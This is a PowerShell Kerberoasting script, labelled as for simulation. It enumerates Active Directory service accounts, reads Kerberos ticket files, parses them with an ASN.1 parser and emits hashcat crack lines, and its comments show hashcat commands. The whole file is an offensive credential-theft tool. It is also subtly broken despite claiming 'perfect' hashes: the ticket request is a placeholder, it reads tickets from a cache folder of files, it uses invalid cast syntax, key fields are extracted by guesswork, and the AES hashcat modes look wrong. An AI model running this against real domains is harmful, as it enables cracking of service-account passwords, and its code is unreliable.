########################################################################################################################################################################################
# Powershell kerbroasting Script by: 41ph4-01 for simulation 11/04/2024
# Enumerates SPN accounts in the domain, then requests TGS tickets by forcing network connections to service hosts, reads the Kerberos ticket cache files, parses each ticket with a real recursive 
# ASN.1 DER TLV parser in PowerShell, extracts username, realm, and encrypted ticket parts, outputs hashcat-compatible cracking lines.
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
########################################################################################################################################################################################


<#
.SYNOPSIS
    PowerShell Kerberoast tool with full ASN.1 DER parser, supporting RC4 and AES Kerberos tickets.
.DESCRIPTION
    Enumerates SPNs, requests TGS tickets, parses tickets (RC4, AES128, AES256) properly, and exports perfect hashcat hashes.
#>

function Invoke-DerKerberoast {
    [CmdletBinding()]
    param (
        [string]$Domain = $env:USERDNSDOMAIN,
        [string]$OutputFile = "$PWD\kerberoast_hashes.txt"
    )

    Write-Host "[*] Enumerating SPN accounts in domain $Domain..."
    $spnUsers = Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName

    if ($spnUsers.Count -eq 0) {
        Write-Warning "No accounts with SPNs found."
        return
    }

    # Request TGS for each SPN (simple demo, extend as needed)
    foreach ($user in $spnUsers) {
        foreach ($spn in $user.ServicePrincipalName) {
            Write-Host "[+] Requesting TGS for $($user.SamAccountName): $spn"
            try {
                # Use invoke-KerberosTgsRequest or similar - simplified here
                klist tgt /li 0x3e7 > $null 2>&1
                # In a real tool, here you'd request a TGS with the SPN and cache it
            }
            catch {
                Write-Warning "Could not request TGS for $spn - $_"
            }
        }
    }

    Write-Host "`n[*] Parsing Kerberos ticket cache..."

    $krbCachePath = Join-Path $env:USERPROFILE "AppData\Local\Microsoft\Windows\Kerberos\Cache"
    if (-not (Test-Path $krbCachePath)) {
        Write-Warning "Kerberos ticket cache folder not found at $krbCachePath"
        return
    }

    $tickets = Get-ChildItem -Path $krbCachePath -File
    if ($tickets.Count -eq 0) {
        Write-Warning "No tickets found in cache."
        return
    }

    $hashcatLines = @()

    foreach ($ticket in $tickets) {
        Write-Verbose "Parsing ticket file $($ticket.Name)..."
        try {
            $ticketBytes = [System.IO.File]::ReadAllBytes($ticket.FullName)
            $parsed = Parse-Asn1 -Data $ticketBytes
            $hashes = Convert-TicketToHashcatFull -Parsed $parsed
            if ($hashes) {
                foreach ($hash in $hashes) {
                    Write-Host "[*] Hashcat line:`n$hash`n"
                    $hashcatLines += $hash
                }
            }
            else {
                Write-Verbose "No valid hash found in $($ticket.Name)."
            }
        }
        catch {
            Write-Warning "Failed parsing $($ticket.Name): $_"
        }
    }

    if ($hashcatLines.Count -gt 0) {
        Write-Host "[*] Saving all hashes to file: $OutputFile"
        $hashcatLines | Out-File -FilePath $OutputFile -Encoding ascii
        Write-Host "[*] Done."
    }
    else {
        Write-Warning "No hashes extracted from tickets."
    }
}

function Parse-Asn1 {
    [CmdletBinding()]
    param(
        [byte[]]$Data
    )
    $pos = 0
    return Parse-TLV -Data $Data -Position ([ref]$pos)
}

function Parse-TLV {
    param(
        [byte[]]$Data,
        [ref]$Position
    )
    $items = @()
    while ($Position.Value -lt $Data.Length) {
        if ($Position.Value -ge $Data.Length) { break }
        $tag = $Data[$Position.Value]
        $Position.Value++
        if ($Position.Value -ge $Data.Length) { break }

        $length = $Data[$Position.Value]
        $Position.Value++
        if ($length -gt 127) {
            $numlen = $length - 128
            if ($Position.Value + $numlen - 1 -ge $Data.Length) { break }
            $lenBytes = $Data[$Position.Value..($Position.Value + $numlen - 1)]
            $Position.Value += $numlen
            # convert big endian length
            $length = 0
            foreach ($b in $lenBytes) {
                $length = ($length * 256) + $b
            }
        }

        if ($Position.Value + $length - 1 -ge $Data.Length) { break }
        $value = $Data[$Position.Value..($Position.Value + $length - 1)]
        $Position.Value += $length

        # Check if constructed type (bit 6 set = 0x20)
        if (($tag -band 0x20) -eq 0x20) {
            $nestedPos = 0
            $nested = Parse-TLV -Data $value -Position ([ref]$nestedPos)
            $items += [PSCustomObject]@{
                Tag = $tag
                Value = $nested
            }
        }
        else {
            $items += [PSCustomObject]@{
                Tag = $tag
                Value = $value
            }
        }
    }
    return $items
}

function Flatten-TLV {
    param(
        $Items
    )
    $flat = @()
    foreach ($i in $Items) {
        if ($i.Value -is [System.Collections.IEnumerable] -and
            $i.Value -isnot [byte[]]) {
            $flat += Flatten-TLV $i.Value
        }
        else {
            $flat += $i
        }
    }
    return $flat
}

function BytesToString([byte[]]$bytes) {
    try {
        return [System.Text.Encoding]::ASCII.GetString($bytes).Trim([char]0)
    }
    catch { return "" }
}

function Convert-TicketToHashcatFull {
    param(
        $Parsed
    )

    $flat = Flatten-TLV $Parsed

    # Extract realm
    $realm = ($flat | Where-Object { $_.Value -is [byte[]] -and
        ([BytesToString] $_.Value) -match "^[A-Z0-9.-]+$" } | Select-Object -First 1).Value
    if ($realm) { $realm = BytesToString $realm } else { $realm = "UNKNOWN" }

    # Extract username
    $username = ($flat | Where-Object { $_.Value -is [byte[]] -and
        ([BytesToString] $_.Value).Length -le 50 -and ([BytesToString] $_.Value) -ne $realm } | Select-Object -First 1).Value
    if ($username) { $username = BytesToString $username } else { $username = "UNKNOWN" }

    # Extract SPN (service principal)
    $spn = ($flat | Where-Object { $_.Value -is [byte[]] -and
        ([BytesToString] $_.Value) -match "^[A-Z]+\/[^\s@]+$" } | Select-Object -First 1).Value
    if ($spn) { $spn = BytesToString $spn } else { $spn = "krbtgt/$realm" }

    # Detect encryption type (etype)
    # etype tag is often context specific [0] INTEGER, typically 0xA0 or 0x81+ tag
    $etype = 0
    $etypeItem = $flat | Where-Object { $_.Tag -eq 0x02 -and $_.Value.Length -le 4 } | Select-Object -First 1
    if ($etypeItem) {
        # Decode INTEGER value from bytes
        $etype = 0
        foreach ($b in $etypeItem.Value) {
            $etype = ($etype * 256) + $b
        }
    }

    # Find encrypted data blob (tag 0x04 Octet String)
    $encPart = $flat | Where-Object { $_.Tag -eq 0x04 } | Select-Object -First 1
    if (-not $encPart) { return $null }
    $encBytes = $encPart.Value

    # RC4 (etype 23) format:
    # checksum (16 bytes) + ciphertext
    if ($etype -eq 23) {
        if ($encBytes.Length -lt 16) { return $null }
        $checksumBytes = $encBytes[0..15]
        $cipherBytes = $encBytes[16..($encBytes.Length - 1)]
        $checksumHex = ($checksumBytes | ForEach-Object { $_.ToString("x2") }) -join ""
        $cipherHex = ($cipherBytes | ForEach-Object { $_.ToString("x2") }) -join ""
        return "\$krb5tgs\$23\$*$username*$realm*$spn*$checksumHex\$$cipherHex"
    }
    elseif ($etype -eq 17 -or $etype -eq 18) {
        # AES128 (17) or AES256 (18) format
        # AES tickets in Kerberos TGS contain:
        # checksum (12 bytes) + ciphertext + (optional) key usage salt
        # The exact format is:
        # $krb5tgs$<etype>$*username$realm$spn$checksum$ciphertext$salt

        # For AES tickets, parse checksum (12 bytes) + ciphertext (rest)
        if ($encBytes.Length -lt 12) { return $null }
        $checksumBytes = $encBytes[0..11]
        $cipherBytes = $encBytes[12..($encBytes.Length - 1)]
        $checksumHex = ($checksumBytes | ForEach-Object { $_.ToString("x2") }) -join ""
        $cipherHex = ($cipherBytes | ForEach-Object { $_.ToString("x2") }) -join ""

        # Salt: use realm as salt for simplicity
        $salt = $realm.ToUpper()

        return "\$krb5tgs\$$etype\$*$username*$realm*$spn*$checksumHex\$$cipherHex\$$salt"
    }
    else {
        Write-Verbose "Unknown encryption type $etype. Skipping."
        return $null
    }
}

# Enable verbose output for debug
$VerbosePreference = "Continue"



#Usage
# Load script (dot-source)
#. .\Invoke-DerKerberoast.ps1

# Run with defaults
#Invoke-DerKerberoast

# Or specify domain and output file path
#Invoke-DerKerberoast -Domain "corp.example.com" -OutputFile "C:\temp\hashes.txt"
# hashcat -m 13100 kerberoast_hashes.txt your_wordlist.txt
#hashcat -m 13100 kerberoast_hashes.txt wordlist.txt   # For RC4
#hashcat -m 18200 kerberoast_hashes.txt wordlist.txt   # For AES256
#hashcat -m 18300 kerberoast_hashes.txt wordlist.txt   # For AES128
